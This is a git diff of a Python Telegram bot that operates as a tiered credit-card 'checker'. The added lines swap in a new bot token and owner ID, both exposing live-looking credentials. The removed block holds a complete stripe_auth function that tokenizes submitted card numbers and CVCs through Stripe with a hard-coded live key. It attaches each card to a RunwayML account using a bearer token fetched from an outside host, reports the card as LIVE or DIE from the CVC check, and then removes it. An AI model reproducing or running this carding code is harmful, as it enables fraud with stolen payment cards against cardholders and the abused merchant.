@@ -14,7 +14,7 @@ import pytz
 #
 #
 #
-premium = ['888464923', '5535605373', '1728762162', '329416283', '1871401156','5568817194']
+premium = ['6603528621']
 #---
 #1: work
 #2: not work
@@ -310,7 +310,7 @@ def get_info(data):
 #
 #
 PREFIX = "!/"
-TOKEN = '5200353658:AAElvyzqplaWwWm4UOwUIrJcKQo3gllTnmg'
+TOKEN = '6749544408:AAE3rzN2UXPxgudrNh5hI-zes2nMsinVc_o'
 storage = MemoryStorage()
 bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
 dp = Dispatcher(bot, storage=storage)
@@ -335,7 +335,7 @@ async def stripeauth(message: types.Message):
     FIRST = ''
   if LAST == None:
     LAST = ''
-  if ID == 1989894564:
+  if ID == 6603528621:
     end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Owner]
 <b>Bot</b>: @{bot_info.username}'''
   elif str(ID) in premium:
@@ -386,7 +386,7 @@ async def braintreeauth(message: types.Message):
     FIRST = ''
   if LAST == None:
     LAST = ''
-  if ID == 1989894564:
+  if ID == 6603528621:
     end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Owner]
 <b>Bot</b>: @{bot_info.username}'''
   elif str(ID) in premium:
@@ -442,7 +442,7 @@ async def getinfo(message: types.Message):
     FIRST = ''
   if LAST == None:
     LAST = ''
-  if ID == 1989894564:
+  if ID == 6603528621:
     end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Owner]
 <b>Bot</b>: @{bot_info.username}'''
   elif str(ID) in premium:
@@ -473,173 +473,3 @@ async def getinfo(message: types.Message):
 #
 if __name__ == '__main__':
   executor.start_polling(dp, skip_updates=True, loop=loop)
-
-
-"""@dp.message_handler(commands='sa', commands_prefix=PREFIX)
-async def stripeauth(message: types.Message):
-  ID = message.from_user.id
-  FIRST = message.from_user.first_name
-  LAST = message.from_user.last_name
-  if FIRST == None:
-    FIRST = ''
-  if LAST == None:
-    LAST = ''
-  if ID == 1989894564:
-    end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Owner]
-<b>Bot</b>: @{bot_info.username}'''
-  elif str(ID) in premium:
-    if available_premium[0] == 1:
-      end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Premium]
-<b>Bot</b>: @{bot_info.username}'''
-    elif available_premium[0] == 2:
-      await message.answer(f'''⚠️ <b>ACCESS DENIED</b> ⚠️
-<b>Message</b>: You can't access to this command.''')
-      return
-  else:
-    if available_free[0] == 1:
-      end = f'''<b>Checked by</b>: <a href="tg://user?id={ID}">{FIRST} {LAST}</a> [Free User]
-<b>Bot</b>: @{bot_info.username}'''
-    elif available_free[0] == 2:
-      await message.answer(f'''⚠️ <b>ACCESS DENIED</b> ⚠️
-<b>Message</b>: You can't access to this command.''')
-      return
-  data = str(message.text).replace('/sa', '')
-  data = data.replace(' ', '')
-  await message.answer_chat_action("typing")
-  vaild = data_vaild(data)
-  if vaild == 0:
-    first_time = time.time()
-    msg = 'UnauthorizedError: The token has been revoked.'
-    while 'The token has been revoked.' in msg:
-      msg = stripe_auth(data)
-    taken_time = round((time.time()-first_time),2)
-    with open('log.txt', 'a') as f:
-      checked_time = time_log()
-      f.write(msg+checked_time+'\n-----------------------\n')
-    await message.reply(f'{msg}\n<b>Time</b>: {taken_time}s\n{end}')
-  elif vaild == -1:
-    await message.reply(f'''<b>⚠️ STRIPE AUTH WARNING ⚠️</b>
-<b>Message</b>: Invalid format
-{end}''')
-  elif vaild == -2:
-    await message.reply(f'''<b>⚠️ STRIPE AUTH WARNING ⚠️</b>
-<b>Message</b>: Unsupported Card Type
-{end}''')"""
-
-"""def stripe_auth(data):
-  cc, month, year, ccv = fil_data(data)
-  try:
-    #data_0 = {"username":"nooby122","password":"CC_king20","machineId":null}
-    
-    #req_0 = requests.post('https://api.runwayml.com/v1/login', json = data_0, headers = headers_0)
-    tk = requests.get('https://support.relaxchannel.repl.co/api/token').json()['token']
-    first, last = gen_info()
-    name = f'{first} {last}'
-    get_id = requests.post('https://m.stripe.com/6').json()
-    muid = get_id['muid']
-    guid = get_id['guid']
-    sid = get_id['sid']
-    data_1 = {
-      'card[name]': name,
-      'card[number]': cc,
-      'card[cvc]': ccv,
-      'card[exp_month]': month,
-      'card[exp_year]': year,
-      'guid': guid,
-      'muid': muid,
-      'sid': sid,
-      'payment_user_agent': 'stripe.js/a6f64a353; stripe-js-v3/a6f64a353',
-      'key': 'pk_live_CGs0xz5CvWKEDSS0WYsxE7or',
-      'pasted_fields': 'number'
-    }
-    headers_1 = {
-      'accept': 'application/json',
-      'accept-encoding': 'gzip, deflate, br',
-      'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7', 
-      'content-type': 'application/x-www-form-urlencoded',
-      'origin': 'https://js.stripe.com',
-      'referer': 'https://js.stripe.com/',
-      'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
-      'sec-fetch-site': 'same-site',
-      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
-    }
-    req_1 = requests.post('https://api.stripe.com/v1/tokens', data = data_1, headers = headers_1)
-    if 'id' in req_1.text:
-      token = req_1.json()['id']
-      data_2 = {
-        "source": token,
-      }
-      headers_2 = {
-        'accept': 'application/json',
-        'accept-encoding': 'gzip, deflate, br',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'authorization': f'Bearer {tk}',
-        'content-type': 'application/json',
-        'origin': 'https://app.runwayml.com',
-        'referer': 'https://app.runwayml.com/',
-        'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.76'
-      }
-      req_2 = requests.post('https://api.runwayml.com/v1/profile/add_stripe_card', json=data_2, headers = headers_2)
-      #print(req_2.json())
-      if 'cvc_check' in req_2.text:
-        result = req_2.json()['card']['cvc_check']
-        if result == 'pass':
-          msg = f'''✅ <b>STRIPE AUTH LIVE CCV</b> ✅
-<b>Card</b>: <code>{data}</code>
-<b>Message</b>: Set up the payment method successfully. [cvc_check: pass]'''
-        elif result == 'fail':
-          msg = f'''✅ <b>STRIPE AUTH LIVE CCN</b> ✅
-<b>Card</b>: <code>{data}</code>
-<b>Message</b>: Your card's security code is incorrect. [cvc_check: fail]'''
-        elif result == 'unavailable':
-          msg = f'''❌ <b>STRIPE AUTH DIE</b> ❌
-<b>Card</b>: <code>{data}</code>
-<b>Message</b>:  Can't check CVC. [cvc_check: {result}]'''
-        else:
-          msg = f'''✅ <b>STRIPE AUTH MAYBE LIVE</b> ✅
-<b>Card</b>: <code>{data}</code>
-<b>Message</b>:  Uncheck CVC. [cvc_check: {result}]'''
-        card_id = req_2.json()['card']['id']
-        data_3 = {
-          "cardID": card_id
-        }
-        headers_3 = {
-          'accept': 'application/json',
-          'accept-encoding': 'gzip, deflate, br',
-          'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-          'authorization': f'Bearer {tk}',
-          'content-type': 'application/json',
-          'origin': 'https://app.runwayml.com',
-          'referer': 'https://app.runwayml.com/',
-          'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
-          'sec-ch-ua-platform': '"Windows"',
-          'sec-fetch-site': 'same-site',
-          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.76'
-        }
-        req_3 = requests.post('https://api.runwayml.com/v1/profile/remove_stripe_card', json = data_3, headers = headers_3)
-        if 'true' not in req_3.text:
-          with open('check.txt', 'a') as f:
-            f.write(f'Data: {data} [unremoved]')
-      else:
-        mes = req_2.json()['error']
-        if mes == "Your card's security code is incorrect.":
-          msg = f'''✅ <b>STRIPE AUTH LIVE CCN</b> ✅
-<b>Card</b>: <code>{data}</code>
-<b>Message</b>: Your card's security code is incorrect.'''
-        else:
-          msg = f'''❌ <b>STRIPE AUTH DIE</b> ❌
-<b>Card</b>: <code>{data}</code>
-<b>Message</b>: {mes}'''
-    else:
-      msg = f'''❌ <b>STRIPE AUTH DIE</b> ❌
-<b>Card</b>: <code>{data}</code>
-<b>Message</b>: can't_create_payment_id'''
-  except:
-    msg = f'''⚠️ <b>STRIPE AUTH WARNING</b> ⚠️
-<b>Card</b>: <code>{data}</code>
-<b>Message</b>: Error occured.'''
-  finally:
-    return msg"""
